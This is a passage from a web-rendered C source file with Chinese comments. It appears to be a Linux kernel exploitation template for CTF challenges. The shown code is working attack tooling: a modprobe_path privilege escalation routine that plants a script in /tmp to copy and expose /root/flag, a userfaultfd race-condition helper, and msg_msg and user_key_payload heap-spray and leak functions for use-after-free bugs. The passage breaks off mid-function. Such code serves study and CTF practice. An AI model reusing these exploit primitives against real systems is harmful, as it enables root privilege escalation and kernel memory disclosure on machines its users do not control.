class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables</span></span><br><span class="line"><span class="comment"> * 定义使用到的全局变量</span></span><br><span class="line"><span class="comment"> * 使用 gXXX 统一命名，避免与局部变量命名冲突</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> gfd1, gfd2, gfd3, gfd4;</span><br><span class="line"><span class="type">void</span> *gaddr1, *gaddr2, *gaddr3, *gaddr4;</span><br><span class="line"><span class="type">uint64_t</span> glen1, glen2, glen3, glen4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Structures</span></span><br><span class="line"><span class="comment"> * 定义辅助结构体</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Macros</span></span><br><span class="line"><span class="comment"> * 定义辅助宏</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(!(cond)) \</span></span><br><span class="line"><span class="meta">    &#123; \</span></span><br><span class="line"><span class="meta">        printf(<span class="string">&quot;Line:%d: &#x27;%s&#x27; assertion failed\n&quot;</span>, \</span></span><br><span class="line"><span class="meta">               __LINE__, #cond); \</span></span><br><span class="line"><span class="meta">        perror(#cond); \</span></span><br><span class="line"><span class="meta">        fflush(stdout); \</span></span><br><span class="line"><span class="meta">        exit(EXIT_FAILURE); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">    ((size_t) &amp;((TYPE*)0)-&gt;MEMBER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __X32_SYSCALL_BIT   0x40000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_x32(nr, args...) \</span></span><br><span class="line"><span class="meta">    syscall((nr) + __X32_SYSCALL_BIT, ##args)</span></span><br><span class="line"><span class="comment">/* 在/usr/include/x86_64-linux-gnu/bits/syscall.h中</span></span><br><span class="line"><span class="comment"> * 查看x64下的系统调用信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_x64(nr, args...) \</span></span><br><span class="line"><span class="meta">    syscall((nr), ##args)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* modprobe_path提权</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`</span></span><br><span class="line"><span class="comment"> * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/232545#h3-6</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modprobe_exp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set fake modprobe content\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/a&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /root/flag /tmp/flag&#x27; &gt;&gt; /tmp/a&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/flag&#x27; &gt;&gt; /tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set fake modprobe permission\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set unknown file content\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] set unknown file permission\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] run unknown file\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[modprobe_exp] read the flag\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userfaultfd条件竞争</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd机制被启用</span></span><br><span class="line"><span class="comment"> *      2. userfaultfd保护机制被关闭，即</span></span><br><span class="line"><span class="comment"> * /proc/sys/vm/unprivileged_userfaultfd 被设置为1</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd_exp():@addr是通过</span></span><br><span class="line"><span class="comment"> * mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE</span></span><br><span class="line"><span class="comment">        | MAP_ANONYMOUS, -1, 0) 申请的，此时内核仅仅分配了页表，</span></span><br><span class="line"><span class="comment"> * 并未分配物理页进行映射</span></span><br><span class="line"><span class="comment"> *      2. userfaultfd_exp():@len为通过mmap申请@addr时，传入的@len值</span></span><br><span class="line"><span class="comment"> *      3. userfaultfd_exp():@thread为自定义的进程 handler，其用于与内核进行交互，</span></span><br><span class="line"><span class="comment"> * 从而触发page fault</span></span><br><span class="line"><span class="comment"> *      3. userfaultfd_exp():@handler为自定义的userfaultfd handler，</span></span><br><span class="line"><span class="comment"> * 其会在内核进程触发page fault时，在userfaultfd_handler中被调用。</span></span><br><span class="line"><span class="comment"> * 其接受@page为参数，@page页内容在调用完@handler后，被用于初始化分配给内核进程的页</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值:</span></span><br><span class="line"><span class="comment"> *      1. userfaultfd_exp():@ret返回@thread创建的pthread_t，用于进程同步. </span></span><br><span class="line"><span class="comment"> * 在直白一些，通过调用pthread_join(@ret)，确保@thread已经触发page fault，</span></span><br><span class="line"><span class="comment"> * 并且@handler已经被执行结束</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> uffd;                       <span class="comment">/* 在userfaultfd_exp()中的uffd局部变量 */</span></span><br><span class="line">    <span class="type">void</span> *(*handler)(<span class="type">void</span> *page);   <span class="comment">/* 在userfaultfd_handler()中，执行的用户自定义</span></span><br><span class="line"><span class="comment">                                     * handler, 其中参数@page内容将在userfaultfd_handler()</span></span><br><span class="line"><span class="comment">                                     * 中，被用于初始化触发page fault的页 */</span></span><br><span class="line">    <span class="type">int</span> pg_size;                    <span class="comment">/* 即页的大小 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> * <span class="title function_">userfaultfd_handler</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span> *<span class="title">uffd_arg</span> =</span> arg;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] create the page\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="literal">NULL</span>)</span><br><span class="line">        assert((page = mmap(<span class="literal">NULL</span>, uffd_arg-&gt;pg_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                            MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>))</span><br><span class="line">                != MAP_FAILED);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] wait for event\n&quot;</span>);</span><br><span class="line">        pollfd.fd = uffd_arg-&gt;uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        assert(poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] read the event\n&quot;</span>);</span><br><span class="line">        assert(read(uffd_arg-&gt;uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) != <span class="number">0</span>);</span><br><span class="line">        assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] execute user-defined handler\n&quot;</span>);</span><br><span class="line">        (*uffd_arg-&gt;handler)(page);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_handler] handle page fault\n&quot;</span>);</span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(uffd_arg-&gt;pg_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = uffd_arg-&gt;pg_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        assert(ioctl(uffd_arg-&gt;uffd, UFFDIO_COPY, &amp;uffdio_copy) != <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">pthread_t</span> <span class="title function_">userfaultfd_exp</span><span class="params">(<span class="type">void</span> *addr, <span class="type">uint64_t</span> len, <span class="type">void</span> *(*thread)(<span class="type">void</span> *arg),</span></span><br><span class="line"><span class="params">                     <span class="type">void</span> *(*handler)(<span class="type">void</span> *page))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_arg</span>* <span class="title">uffd_arg</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> PG_SIZE = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create userfaultfd object\n&quot;</span>);</span><br><span class="line">    assert((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] set the userfaultfd api\n&quot;</span>);</span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    assert(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] register the memory range\n&quot;</span>);</span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = (len + PG_SIZE - <span class="number">1</span>) / PG_SIZE * PG_SIZE;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    assert(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create the thread to handle userfaultfd events\n&quot;</span>);</span><br><span class="line">    assert((uffd_arg = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*uffd_arg))) != <span class="literal">NULL</span>);</span><br><span class="line">    uffd_arg-&gt;uffd = uffd;</span><br><span class="line">    uffd_arg-&gt;handler = handler;</span><br><span class="line">    uffd_arg-&gt;pg_size = PG_SIZE;</span><br><span class="line">    assert(pthread_create(&amp;thr, <span class="literal">NULL</span>, userfaultfd_handler, uffd_arg) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[userfaultfd_exp] create the thread to trigger the page fault\n&quot;</span>);</span><br><span class="line">    assert(pthread_create(&amp;thr, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> thr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct msg_msg读</span></span><br><span class="line"><span class="comment"> * 结构体:</span></span><br><span class="line"><span class="comment"> *          struct msg_msg &#123;</span></span><br><span class="line"><span class="comment"> *              struct list_head m_list;</span></span><br><span class="line"><span class="comment"> *              long m_type;</span></span><br><span class="line"><span class="comment"> *              size_t m_ts;    // message text大小</span></span><br><span class="line"><span class="comment"> *              struct msg_msgseg *next;</span></span><br><span class="line"><span class="comment"> *              void *security; // 由于未开启SELinux，该字段恒为0</span></span><br><span class="line"><span class="comment"> *              // 用户定义数据从这里开始</span></span><br><span class="line"><span class="comment"> *          &#125;;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 条件:</span></span><br><span class="line"><span class="comment"> *      1. 驱动中存在UAF，块大小为[0x30, 0x2000]，可以更改内存的[0x18, 0x28)处的值</span></span><br><span class="line"><span class="comment"> *      2. 如果更改了内存的[0x0, 0x10)的值，则需要调用recv_msg()，其需要内核</span></span><br><span class="line"><span class="comment"> * 开启CONFIG_CHECKPOINT_RESTORE设置；否则调用recv_msg_nocopy()即可</span></span><br><span class="line"><span class="comment"> *      3. recv_msg()读取信息时，需要和struct msg_msg的m_ts相同大小，否则会</span></span><br><span class="line"><span class="comment"> * 返回异常</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. send_msg():@size，指内核态申请的内存大小，其会包含0x30的</span></span><br><span class="line"><span class="comment"> * struct msg_msg头</span></span><br><span class="line"><span class="comment"> *      2. send_msg():@content, 即用户定义的消息内容，其会被复制到</span></span><br><span class="line"><span class="comment"> * 内核态申请的内存中，主要用来查找这部分内存，可以设置为标志性字符串，如</span></span><br><span class="line"><span class="comment"> * &quot;hhaawwkk1&quot;等</span></span><br><span class="line"><span class="comment"> *      3. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()</span></span><br><span class="line"><span class="comment"> * 返回值</span></span><br><span class="line"><span class="comment"> *      4. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype</span></span><br><span class="line"><span class="comment"> * 内容和struct msg_msg头和@size的数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 返回值:</span></span><br><span class="line"><span class="comment"> *      1. send_msg():@ret返回创建的消息队列id</span></span><br><span class="line"><span class="comment"> *      2. recv_msg*():@ret返回读取的缓冲数组</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参考:</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/252558</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/ipc/msg.c#L848</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;    <span class="comment">// message text大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> *security; <span class="comment">// 由于未开启SELinux，该字段恒为0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">send_msg</span><span class="params">(<span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *content)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">msgbuf</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[size - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    &#125; msg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建</span></span><br><span class="line">    assert((qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    msg.mtype = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(msg.mtext, content, size - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg));</span><br><span class="line">    assert(msgsnd(qid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[send_msg] msgget = %d\n&quot;</span>, qid);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> qid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">recv_msg</span><span class="params">(<span class="type">int</span> qid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *memdump;</span><br><span class="line"></span><br><span class="line">    assert((memdump = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(msgrcv(qid, memdump, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> memdump;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">recv_msg_nocopy</span><span class="params">(<span class="type">int</span> qid, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *memdump;</span><br><span class="line"></span><br><span class="line">    assert((memdump = <span class="built_in">malloc</span>(size)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(msgrcv(qid, memdump, size, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> memdump;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct user_key_payload读</span></span><br><span class="line"><span class="comment"> * 结构体:</span></span><br><span class="line"><span class="comment"> *        struct user_key_payload &#123;</span></span><br><span class="line"><span class="comment"> *        	struct rcu_head	rcu;		// RCU destructor</span></span><br><span class="line"><span class="comment"> *        	unsigned short	datalen;	// length of this data</span></span><br><span class="line"><span class="comment"> *        	char		        data[] __aligned(__alignof__(u64)); // actual data</span></span><br><span class="line"><span class="comment"> *        &#125;;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 条件：</span></span><br><span class="line"><span class="comment"> *      1. 驱动中存在UAF，块大小为[0x18, 0x10000]，可以更改内存的[0x10, 0x14)处的值</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *      1. spray_addkey():@payload，即用户上传的key内容，被复制到data部分</span></span><br><span class="line"><span class="comment"> *      2. spray_addkey():@size，即内核要申请的data大小,h. 注意，spray_addkey()中，</span></span><br><span class="line"><span class="comment"> * 内核会申请两个大小相近的块，`kvmalloc(@size, GFP_KERNEL)`和</span></span><br><span class="line"><span class="comment"> * `kmalloc(sizeof(struct user_key_payload) + @size, GFP_KERNEL)`</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *      1. spray_addkey():@ret，即创建的key的唯一表示</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 参考：</span></span><br><span class="line"><span class="comment"> * https://www.anquanke.com/post/id/228233#h3-10</span></span><br><span class="line"><span class="comment"> * https://github.com/Markakd/n1ctf2020_W2L/blob/main/leak.c</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/keyctl.c#L74</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/key.c#L816</span></span><br><span class="line"><span class="comment"> * https://elixir.bootlin.com/linux/v6.1/source/security/keys/user_defined.c#L59</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_MAX_DESC_SIZE 4096</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="type">char</span>		data[] __attribute__ ((__aligned__(<span class="keyword">sizeof</span>(__u64)))); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">key_serial_t</span> <span class="title function_">spray_addkey</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *payload, <span class="type">uint32_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *payload_buf;</span><br><span class="line">  <span class="type">key_serial_t</span> key;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 减去struct user_key_payload头，确保内核申请的大小为</span></span><br><span class="line"><span class="comment">   * @size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  assert(size &gt;= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload));</span><br><span class="line">  size -= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload);</span><br><span 